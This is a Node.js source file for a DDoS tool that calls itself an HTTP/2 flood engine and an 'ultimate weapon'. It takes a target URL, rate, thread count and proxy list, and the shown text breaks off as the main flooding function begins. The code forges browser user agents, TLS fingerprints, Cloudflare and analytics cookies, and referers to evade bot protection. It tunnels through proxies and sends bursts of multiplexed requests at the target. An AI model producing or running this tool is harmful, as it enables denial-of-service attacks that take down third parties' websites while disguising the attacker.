const fs = require("fs");
const http2 = require("http2");
const tls = require("tls");
const net = require("net");
const crypto = require("crypto");
const cluster = require("cluster");
const url = require("url");
const https = require("https");
const path = require("path");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

if (process.argv.length < 7) {
    console.log(`
╔═══════════════════════════════════════════════════════════════════════════════╗
║     🔥 BROWSER ULTIMATE V4 - MAXIMUM POWER HTTP/2 FLOOD ENGINE 🔥             ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  Combining 4 powerful browser engines into ONE ultimate weapon:               ║
║  ✓ Browser Engine V3 - HTTP/2 Multiplexing + JA3 Fingerprinting               ║
║  ✓ Browser V2 - Playwright Firefox Bypass                                     ║
║  ✓ Browser Engine - Puppeteer Stealth + Protection Bypass                     ║
║  ✓ Brow - Cluster Mode + Advanced TLS Ciphers                                 ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║ Usage: node browser-ultimate.js <target> <time> <rate> <threads> <proxy.txt>  ║
║                                                                               ║
║ Example:                                                                      ║
║   node browser-ultimate.js https://target.com 120 64 8 proxy.txt              ║
║                                                                               ║
║ Features:                                                                     ║
║   • HTTP/2 Multiplexing with HPACK compression                                ║
║   • TLS 1.3 with JA3/JA4 fingerprint randomization                            ║
║   • Real browser fingerprints (Chrome/Firefox/Safari/Edge/Opera)              ║
║   • Cookie & session simulation with Google Analytics                         ║
║   • Connection pooling & keepalive optimization                               ║
║   • Cluster mode for maximum performance                                      ║
║   • 384,000+ User-Agents database                                             ║
║   • Advanced anti-detection headers                                           ║
║   • Multiple cipher suites for each browser                                   ║
║   • Randomized referer spoofing                                               ║
║   • Dynamic query string generation                                           ║
║   • Mobile & Desktop fingerprints                                             ║
║   • Cross-Origin Embedder Policy bypass                                       ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    `);
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]) || 60;
const rates = parseInt(process.argv[4]) || 64;
const threads = parseInt(process.argv[5]) || 8;
const proxyFile = process.argv[6];

let userAgents = [];
try {
    const uaPath = path.join(__dirname, '..', '..', '..', 'assets', 'ua.txt');
    userAgents = fs.readFileSync(uaPath, 'utf8').split('\n').filter(ua => ua.trim());
    console.log(`[+] Loaded ${userAgents.length} User-Agents from database`);
} catch (e) {
    userAgents = [];
}

const CHROME_VERSIONS = ['120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137'];
const FIREFOX_VERSIONS = ['120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139'];
const SAFARI_VERSIONS = ['17.0', '17.1', '17.2', '17.3', '17.4', '17.5', '18.0', '18.1', '18.2', '18.3', '18.4', '18.5'];
const EDGE_VERSIONS = ['120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137'];
const OPERA_VERSIONS = ['106', '107', '108', '109', '110', '111', '112', '113', '114'];

const OS_PLATFORMS = {
    windows: [
        'Windows NT 10.0; Win64; x64',
        'Windows NT 11.0; Win64; x64',
        'Windows NT 10.0; WOW64',
        'Windows NT 6.3; Win64; x64',
        'Windows NT 6.1; Win64; x64'
    ],
    mac: [
        'Macintosh; Intel Mac OS X 10_15_7',
        'Macintosh; Intel Mac OS X 14_0',
        'Macintosh; Intel Mac OS X 14_1',
        'Macintosh; Intel Mac OS X 14_2',
        'Macintosh; Intel Mac OS X 14_3',
        'Macintosh; Intel Mac OS X 14_4',
        'Macintosh; Intel Mac OS X 14_5',
        'Macintosh; Intel Mac OS X 15_0',
        'Macintosh; Apple M1',
        'Macintosh; Apple M2',
        'Macintosh; Apple M3'
    ],
    linux: [
        'X11; Linux x86_64',
        'X11; Ubuntu; Linux x86_64',
        'X11; Fedora; Linux x86_64',
        'X11; Linux i686',
        'X11; Debian; Linux x86_64'
    ],
    android: [
        'Linux; Android 13',
        'Linux; Android 14',
        'Linux; Android 15',
        'Linux; Android 14; SM-S928B',
        'Linux; Android 15; Pixel 9 Pro',
        'Linux; Android 14; SM-G998B',
        'Linux; Android 15; OnePlus 12'
    ],
    ios: [
        'iPhone; CPU iPhone OS 17_0 like Mac OS X',
        'iPhone; CPU iPhone OS 17_5 like Mac OS X',
        'iPhone; CPU iPhone OS 18_0 like Mac OS X',
        'iPhone; CPU iPhone OS 18_4 like Mac OS X',
        'iPhone; CPU iPhone OS 18_5 like Mac OS X',
        'iPad; CPU OS 17_5 like Mac OS X',
        'iPad; CPU OS 18_4 like Mac OS X'
    ]
};

const DEVICE_MODELS = {
    samsung: ['SM-S928B', 'SM-S918B', 'SM-A556B', 'SM-G998B', 'SM-F946B', 'SM-S926B', 'SM-S911B'],
    pixel: ['Pixel 9 Pro', 'Pixel 8 Pro', 'Pixel 8', 'Pixel 9', 'Pixel 8a', 'Pixel Fold'],
    xiaomi: ['2312DRA50G', '23049RAD8C', '2311DRK48G', '23127PN0CG'],
    oneplus: ['CPH2449', 'NE2213', 'LE2115', 'CPH2423', 'IN2025'],
    huawei: ['NOH-AN00', 'OCE-AN10', 'ELZ-AN00']
};

function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomHex(len) { return crypto.randomBytes(len).toString('hex'); }
function randomBase64(len) { return crypto.randomBytes(len).toString('base64').slice(0, len); }
function randomString(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function generateUserAgent() {
    if (userAgents.length > 0 && Math.random() > 0.3) {
        return {
            ua: userAgents[Math.floor(Math.random() * userAgents.length)],
            browser: randomElement(['chrome', 'firefox', 'safari', 'edge']),
            version: randomElement(CHROME_VERSIONS),
            mobile: Math.random() > 0.7
        };
    }

    const browserType = randomElement(['chrome', 'chrome', 'chrome', 'firefox', 'safari', 'edge', 'opera']);
    
    switch (browserType) {
        case 'chrome': {
            const version = randomElement(CHROME_VERSIONS);
            const os = randomElement([...OS_PLATFORMS.windows, ...OS_PLATFORMS.mac, ...OS_PLATFORMS.linux]);
            return {
                ua: `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
                browser: 'chrome',
                version,
                mobile: false
            };
        }
        case 'firefox': {
            const version = randomElement(FIREFOX_VERSIONS);
            const os = randomElement([...OS_PLATFORMS.windows, ...OS_PLATFORMS.mac, ...OS_PLATFORMS.linux]);
            return {
                ua: `Mozilla/5.0 (${os}; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
                browser: 'firefox',
                version,
                mobile: false
            };
        }
        case 'safari': {
            const version = randomElement(SAFARI_VERSIONS);
            const os = randomElement(OS_PLATFORMS.mac);
            return {
                ua: `Mozilla/5.0 (${os}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Safari/605.1.15`,
                browser: 'safari',
                version,
                mobile: false
            };
        }
        case 'edge': {
            const version = randomElement(EDGE_VERSIONS);
            const os = randomElement(OS_PLATFORMS.windows);
            return {
                ua: `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Edg/${version}.0.0.0`,
                browser: 'edge',
                version,
                mobile: false
            };
        }
        case 'opera': {
            const version = randomElement(OPERA_VERSIONS);
            const chromeVersion = randomElement(CHROME_VERSIONS);
            const os = randomElement([...OS_PLATFORMS.windows, ...OS_PLATFORMS.mac]);
            return {
                ua: `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36 OPR/${version}.0.0.0`,
                browser: 'opera',
                version,
                mobile: false
            };
        }
    }
}

function generateMobileUserAgent() {
    const deviceType = randomElement(['android_chrome', 'ios_safari', 'android_samsung', 'android_firefox', 'ios_chrome']);
    
    switch (deviceType) {
        case 'android_chrome': {
            const version = randomElement(CHROME_VERSIONS);
            const os = randomElement(OS_PLATFORMS.android);
            return {
                ua: `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
                browser: 'chrome',
                version,
                mobile: true,
                platform: 'Android'
            };
        }
        case 'ios_safari': {
            const version = randomElement(SAFARI_VERSIONS);
            const os = randomElement(OS_PLATFORMS.ios);
            return {
                ua: `Mozilla/5.0 (${os}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Mobile/15E148 Safari/604.1`,
                browser: 'safari',
                version,
                mobile: true,
                platform: 'iOS'
            };
        }
        case 'android_samsung': {
            const version = randomElement(CHROME_VERSIONS);
            const model = randomElement(DEVICE_MODELS.samsung);
            return {
                ua: `Mozilla/5.0 (Linux; Android 15; ${model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
                browser: 'chrome',
                version,
                mobile: true,
                platform: 'Android'
            };
        }
        case 'android_firefox': {
            const version = randomElement(FIREFOX_VERSIONS);
            const os = randomElement(OS_PLATFORMS.android);
            return {
                ua: `Mozilla/5.0 (${os}; rv:${version}.0) Gecko/${version}.0 Firefox/${version}.0`,
                browser: 'firefox',
                version,
                mobile: true,
                platform: 'Android'
            };
        }
        case 'ios_chrome': {
            const version = randomElement(CHROME_VERSIONS);
            const os = randomElement(OS_PLATFORMS.ios);
            return {
                ua: `Mozilla/5.0 (${os}) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${version}.0.0.0 Mobile/15E148 Safari/604.1`,
                browser: 'chrome',
                version,
                mobile: true,
                platform: 'iOS'
            };
        }
    }
}

const acceptHeaders = {
    document: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    xhr: 'application/json, text/plain, */*',
    image: 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
    script: '*/*',
    style: 'text/css,*/*;q=0.1',
    font: 'font/woff2;q=1.0,font/woff;q=0.9,*/*;q=0.8',
    video: 'video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5'
};

const encodings = [
    'gzip, deflate, br, zstd',
    'gzip, deflate, br',
    'br, zstd, gzip',
    'gzip, deflate',
    'br',
    'gzip, identity',
    'deflate, gzip',
    '*',
    'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25'
];

const languages = [
    'en-US,en;q=0.9', 'en-GB,en;q=0.9,en-US;q=0.8', 'es-ES,es;q=0.9,en;q=0.8',
    'fr-FR,fr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'ja-JP,ja;q=0.9,en;q=0.8',
    'zh-CN,zh;q=0.9,en;q=0.8', 'pt-BR,pt;q=0.9,en;q=0.8', 'ko-KR,ko;q=0.9,en;q=0.8',
    'id-ID,id;q=0.9,en;q=0.8', 'ms-MY,ms;q=0.9,en;q=0.8', 'th-TH,th;q=0.9,en;q=0.8',
    'vi-VN,vi;q=0.9,en;q=0.8', 'ru-RU,ru;q=0.9,en;q=0.8', 'ar-SA,ar;q=0.9,en;q=0.8',
    'hi-IN,hi;q=0.9,en;q=0.8', 'tr-TR,tr;q=0.9,en;q=0.8', 'nl-NL,nl;q=0.9,en;q=0.8',
    'pl-PL,pl;q=0.9,en;q=0.8', 'it-IT,it;q=0.9,en;q=0.8', 'sv-SE,sv;q=0.9,en;q=0.8',
    'da-DK,da;q=0.9,en;q=0.8', 'fi-FI,fi;q=0.9,en;q=0.8', 'no-NO,no;q=0.9,en;q=0.8',
    'cs-CZ,cs;q=0.9,en;q=0.8', 'el-GR,el;q=0.9,en;q=0.8', 'he-IL,he;q=0.9,en;q=0.8',
    'ro-RO,ro;q=0.9,en;q=0.8', 'hu-HU,hu;q=0.9,en;q=0.8', 'uk-UA,uk;q=0.9,en;q=0.8'
];

const cacheControls = [
    'no-cache', 'no-store', 'no-transform', 'max-age=0', 'must-revalidate',
    'no-cache, no-store', 'max-age=0, must-revalidate', 'private, no-cache',
    'public, max-age=0', 'no-cache, no-store, must-revalidate',
    'max-age=0, no-cache, no-store, must-revalidate'
];

const TLS_CIPHERS_CHROME = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305'
];

const TLS_CIPHERS_FIREFOX = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
];

const TLS_CIPHERS_SAFARI = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES128-GCM-SHA256'
];

const TLS_CIPHERS_ADVANCED = [
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS'
];

const SIGALGS_CHROME = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';
const SIGALGS_FIREFOX = 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512';
const SIGALGS_SAFARI = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';

const SIGALGS_ADVANCED = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    'ecdsa_brainpoolP256r1tls13_sha256',
    'ecdsa_brainpoolP384r1tls13_sha384',
    'ecdsa_brainpoolP512r1tls13_sha512',
    'ed25519', 'ed448',
    'rsa_pss_pss_sha256', 'rsa_pss_pss_sha384', 'rsa_pss_pss_sha512',
    'ecdsa_secp521r1_sha512'
];

const ECDH_CURVES_CHROME = 'X25519:P-256:P-384';
const ECDH_CURVES_FIREFOX = 'X25519:P-256:P-384:P-521';
const ECDH_CURVES_SAFARI = 'X25519:P-256:P-384';

const COEP_HEADERS = ['require-corp', 'unsafe-none', 'credentialless'];

const referrers = [
    'https://www.google.com/search?q=',
    'https://www.google.com/',
    'https://www.bing.com/search?q=',
    'https://www.facebook.com/',
    'https://www.youtube.com/',
    'https://twitter.com/',
    'https://www.reddit.com/',
    'https://www.linkedin.com/',
    'https://www.instagram.com/',
    'https://www.tiktok.com/',
    'https://duckduckgo.com/?q=',
    'https://www.yahoo.com/search?q=',
    'https://yandex.ru/search?text=',
    'https://www.baidu.com/s?wd=',
    'https://search.yahoo.com/search?p=',
    'https://www.pinterest.com/',
    'https://www.tumblr.com/',
    'https://www.quora.com/',
    'https://medium.com/',
    'https://www.amazon.com/',
    'https://www.ebay.com/',
    'https://www.wikipedia.org/',
    'https://www.twitch.tv/',
    'https://discord.com/',
    'https://slack.com/',
    'https://github.com/',
    'https://stackoverflow.com/'
];

function generateCookie() {
    const cookies = [];
    
    if (Math.random() > 0.4) {
        cookies.push(`_ga=GA1.1.${randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
    }
    if (Math.random() > 0.5) {
        cookies.push(`_gid=GA1.1.${randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
    }
    if (Math.random() > 0.6) {
        cookies.push(`__cf_bm=${randomBase64(32)}`);
    }
    if (Math.random() > 0.5) {
        cookies.push(`session=${randomHex(16)}`);
    }
    if (Math.random() > 0.6) {
        cookies.push(`_fbp=fb.1.${Date.now()}.${randomInt(1000000000, 9999999999)}`);
    }
    if (Math.random() > 0.7) {
        cookies.push(`_gcl_au=1.1.${randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
    }
    if (Math.random() > 0.6) {
        cookies.push(`PHPSESSID=${randomHex(26)}`);
    }
    if (Math.random() > 0.7) {
        cookies.push(`csrftoken=${randomHex(32)}`);
    }
    if (Math.random() > 0.8) {
        cookies.push(`_pk_id.1.${randomHex(4)}=${randomHex(16)}.${Math.floor(Date.now() / 1000)}.1.${Math.floor(Date.now() / 1000)}.`);
    }
    if (Math.random() > 0.7) {
        cookies.push(`cf_clearance=${randomBase64(40)}`);
    }
    
    return cookies.length > 0 ? cookies.join('; ') : null;
}

function generateQuery() {
    const queries = [
        `_=${Date.now()}&r=${randomHex(8)}`,
        `cb=${randomHex(12)}&ts=${Date.now()}`,
        `v=${randomInt(1, 999)}&nc=${randomHex(6)}&t=${Date.now()}`,
        `q=${randomHex(8)}&sid=${randomHex(16)}`,
        `_t=${Date.now()}&_r=${Math.random().toString(36).slice(2)}`,
        `cache=${randomHex(10)}&ver=${randomInt(1, 100)}`,
        `ref=${randomHex(6)}&utm_source=direct&_=${Date.now()}`,
        `page=${randomInt(1, 10)}&limit=${randomInt(10, 100)}`,
        `id=${randomHex(8)}&token=${randomBase64(16)}`,
        `s=${randomString(8)}&lang=${randomElement(['en', 'es', 'fr', 'de', 'ja', 'ko', 'zh'])}`
    ];
    return randomElement(queries);
}

function readProxiesFromFile(filePath) {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        return data.trim().split(/\r?\n/).filter(p => p.trim() && !p.startsWith('#'));
    } catch (error) {
        return [];
    }
}

let parsedUrl;
try {
    parsedUrl = new URL(targetURL);
} catch (e) {
    console.error(`[ERROR] Invalid URL: ${targetURL}`);
    process.exit(1);
}

const proxies = readProxiesFromFile(proxyFile);
const targetHost = parsedUrl.hostname;
const targetPort = parseInt(parsedUrl.port) || (parsedUrl.protocol === 'https:' ? 443 : 80);
const targetPath = parsedUrl.pathname + parsedUrl.search || '/';

let totalSent = 0;
let totalSuccess = 0;
let totalErrors = 0;
let activeConnections = 0;
let bytesReceived = 0;

const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `${hours}:${minutes}:${seconds}`;
};

const agent = new https.Agent({ rejectUnauthorized: false });

async function getTargetStatus() {
    try {
        const response = await new Promise((resolve, reject) => {
            const req = https.get(targetURL, { agent, timeout: 5000 }, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve({ status: res.statusCode, data }));
            });
            req.on('error', reject);
            req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
        });
        
        const titleMatch = response.data.match(/<title>(.*?)<\/title>/i);
        const title = titleMatch ? titleMatch[1] : 'Unknown';
        console.log(`[STATUS] ${getCurrentTime()} | Title: ${title} | Code: ${response.status}`);
    } catch (error) {
        console.log(`[STATUS] ${getCurrentTime()} | Error: ${error.message}`);
    }
}

function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function getTlsOptions(browser = 'chrome') {
    let ciphers, sigalgs, ecdhCurve;
    
    switch (browser) {
        case 'firefox':
            ciphers = TLS_CIPHERS_FIREFOX.join(':');
            sigalgs = SIGALGS_FIREFOX;
            ecdhCurve = ECDH_CURVES_FIREFOX;
            break;
        case 'safari':
            ciphers = TLS_CIPHERS_SAFARI.join(':');
            sigalgs = SIGALGS_SAFARI;
            ecdhCurve = ECDH_CURVES_SAFARI;
            break;
        case 'advanced':
            ciphers = randomElement(TLS_CIPHERS_ADVANCED);
            sigalgs = randomElement(SIGALGS_ADVANCED);
            ecdhCurve = randomElement([ECDH_CURVES_CHROME, ECDH_CURVES_FIREFOX]);
            break;
        default:
            ciphers = TLS_CIPHERS_CHROME.join(':');
            sigalgs = SIGALGS_CHROME;
            ecdhCurve = ECDH_CURVES_CHROME;
    }
    
    return {
        servername: targetHost,
        host: targetHost,
        port: targetPort,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2', 'http/1.1'],
        ciphers,
        sigalgs,
        ecdhCurve,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        honorCipherOrder: false,
        sessionTimeout: 300,
        secureOptions: 
            crypto.constants.SSL_OP_NO_SSLv2 | 
            crypto.constants.SSL_OP_NO_SSLv3 |
            crypto.constants.SSL_OP_NO_COMPRESSION |
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
    };
}

function generateHeaders(uaInfo, requestType = 'document') {
    const path = `${targetPath}${targetPath.includes('?') ? '&' : '?'}${generateQuery()}`;
    const cookie = generateCookie();
    
    const headers = {
        ':method': randomElement(['GET', 'GET', 'GET', 'GET', 'HEAD']),
        ':authority': targetHost,
        ':scheme': 'https',
        ':path': path,
    };

    if (uaInfo.browser === 'chrome' || uaInfo.browser === 'edge' || uaInfo.browser === 'opera') {
        headers['sec-ch-ua'] = `"Chromium";v="${uaInfo.version}", "Not_A Brand";v="24", "Google Chrome";v="${uaInfo.version}"`;
        headers['sec-ch-ua-mobile'] = uaInfo.mobile ? '?1' : '?0';
        headers['sec-ch-ua-platform'] = uaInfo.mobile ? `"${uaInfo.platform || 'Android'}"` : randomElement(['"Windows"', '"macOS"', '"Linux"']);
        headers['sec-ch-ua-full-version-list'] = `"Chromium";v="${uaInfo.version}.0.0.0", "Google Chrome";v="${uaInfo.version}.0.0.0"`;
        headers['sec-ch-ua-arch'] = uaInfo.mobile ? '' : randomElement(['"x86"', '"arm"']);
        headers['sec-ch-ua-bitness'] = uaInfo.mobile ? '' : '"64"';
        headers['sec-ch-ua-model'] = '';
        headers['sec-ch-ua-wow64'] = '?0';
    }

    headers['accept'] = acceptHeaders[requestType] || acceptHeaders.document;
    headers['accept-encoding'] = randomElement(encodings);
    headers['accept-language'] = randomElement(languages);
    headers['cache-control'] = randomElement(cacheControls);
    headers['pragma'] = 'no-cache';
    
    if (requestType === 'document') {
        headers['sec-fetch-dest'] = 'document';
        headers['sec-fetch-mode'] = 'navigate';
        headers['sec-fetch-site'] = randomElement(['none', 'same-origin', 'cross-site']);
        headers['sec-fetch-user'] = '?1';
        headers['upgrade-insecure-requests'] = '1';
    } else {
        headers['sec-fetch-dest'] = randomElement(['empty', 'script', 'image', 'style', 'font']);
        headers['sec-fetch-mode'] = randomElement(['cors', 'no-cors', 'same-origin']);
        headers['sec-fetch-site'] = randomElement(['same-origin', 'same-site', 'cross-site']);
    }

    headers['user-agent'] = uaInfo.ua;
    
    if (cookie) {
        headers['cookie'] = cookie;
    }

    if (Math.random() > 0.5) {
        const ref = randomElement(referrers);
        headers['referer'] = ref.includes('?') ? ref + encodeURIComponent(targetHost) : ref;
    }
    
    if (Math.random() > 0.7) {
        headers['origin'] = `https://${targetHost}`;
    }

    if (Math.random() > 0.5) {
        headers['dnt'] = '1';
    }
    
    if (Math.random() > 0.6) {
        headers['sec-gpc'] = '1';
    }

    if (Math.random() > 0.8) {
        headers['cross-origin-embedder-policy'] = randomElement(COEP_HEADERS);
    }

    if (Math.random() > 0.9) {
        headers['x-requested-with'] = 'XMLHttpRequest';
    }

    return headers;
}

function createHttp2Session(tlsSocket, uaInfo) {
    return new Promise((resolve, reject) => {
        try {
            const client = http2.connect(`https://${targetHost}`, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: randomInt(4096, 65536),
                    maxConcurrentStreams: randomInt(100, 1000),
                    initialWindowSize: randomInt(6291456, 16777216),
                    maxHeaderListSize: randomInt(16384, 262144),
                    enablePush: false,
                    maxFrameSize: 16384
                },
                peerMaxConcurrentStreams: 1000
            });

            client.on('error', () => reject());
            client.on('connect', () => resolve({ client, uaInfo }));
            
            setTimeout(() => reject(), 10000);
        } catch (e) {
            reject();
        }
    });
}

async function sendRequests(session) {
    const { client, uaInfo } = session;
    let completed = 0;
    let sessionSuccess = 0;
    
    return new Promise((resolve) => {
        const requestTypes = ['document', 'xhr', 'script', 'image', 'style', 'font'];
        
        for (let i = 0; i < rates; i++) {
            try {
                const reqType = i === 0 ? 'document' : randomElement(requestTypes);
                const headers = generateHeaders(uaInfo, reqType);
                const req = client.request(headers);
                
                totalSent++;
                
                req.on('response', (headers) => {
                    const status = headers[':status'];
                    if (status >= 200 && status < 500) {
                        totalSuccess++;
                        sessionSuccess++;
                    } else {
                        totalErrors++;
                    }
                });
                
                req.on('data', (chunk) => {
                    bytesReceived += chunk.length;
                });
                
                req.on('end', () => {
                    completed++;
                    if (completed >= rates) {
                        resolve(sessionSuccess);
                    }
                });
                
                req.on('error', () => {
                    totalErrors++;
                    completed++;
                    if (completed >= rates) {
                        resolve(sessionSuccess);
                    }
                });
                
                req.end();
            } catch (e) {
                totalErrors++;
                completed++;
            }
        }
        
        setTimeout(() => resolve(sessionSuccess), 8000);
    });
}

async function flood(proxy) {
    activeConnections++;
    
    try {
        const isMobile = Math.random() > 0.7;
        const uaInfo = isMobile ? generateMobileUserAgent() : generateUserAgent();
        const tlsType = randomElement(['chrome', 'firefox', 'safari', 'advanced', 'chrome', 'chrome']);
        const tlsOptions = getTlsOptions(tlsType);
        
        if (proxy) {
            const proxyParts = proxy.split(':');
            const proxyHost = proxyParts[0];
            const proxyPort = parseInt(proxyParts[1]) || 80;
            const proxyAuth = proxyParts.length >= 4 ? 
                Buffer.from(`${proxyParts[2]}:${proxyParts[3]}`).toString('base64') : null;

            await new Promise((resolve, reject) => {
                const socket = net.connect({
                    host: proxyHost,
                    port: proxyPort,
                    timeout: 8000
                });

                socket.once('connect', () => {
                    let connectReq = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\n` +
                        `Host: ${targetHost}:${targetPort}\r\n` +
                        `Proxy-Connection: keep-alive\r\n`;
                    
                    if (proxyAuth) {
                        connectReq += `Proxy-Authorization: Basic ${proxyAuth}\r\n`;
                    }
                    
                    connectReq += `User-Agent: ${uaInfo.ua}\r\n\r\n`;
                    socket.write(connectReq);
                });

                socket.once('data', async (data) => {
                    if (data.toString().includes('200')) {
                        tlsOptions.socket = socket;
                        const tlsSocket = tls.connect(tlsOptions);
                        
                        tlsSocket.once('secureConnect', async () => {
                            if (tlsSocket.alpnProtocol === 'h2') {
                                try {
                                    const session = await createHttp2Session(tlsSocket, uaInfo);
                                    await sendRequests(session);
                                    session.client.close();
                                } catch (e) {
                                    totalErrors++;
                                }
                            }
                            resolve();
                        });
                        
                        tlsSocket.on('error', () => {
                            totalErrors++;
                            resolve();
                        });
                    } else {
                        totalErrors++;
                        socket.destroy();
                        resolve();
                    }
                });

                socket.on('error', () => { totalErrors++; resolve(); });
                socket.on('timeout', () => { socket.destroy(); resolve(); });
            });
        } else {
            const tlsSocket = tls.connect(tlsOptions);
            
            await new Promise((resolve) => {
                tlsSocket.once('secureConnect', async () => {
                    if (tlsSocket.alpnProtocol === 'h2') {
                        try {
                            const session = await createHttp2Session(tlsSocket, uaInfo);
                            await sendRequests(session);
                            session.client.close();
                        } catch (e) {
                            totalErrors++;
                        }
                    }
                    tlsSocket.destroy();
                    resolve();
                });
                
                tlsSocket.on('error', () => {
                    totalErrors++;
                    resolve();
                });
                
                setTimeout(resolve, 12000);
            });
        }
    } catch (e) {
        totalErrors++;
    }
    
    activeConnections--;
}

async function startFlooding() {
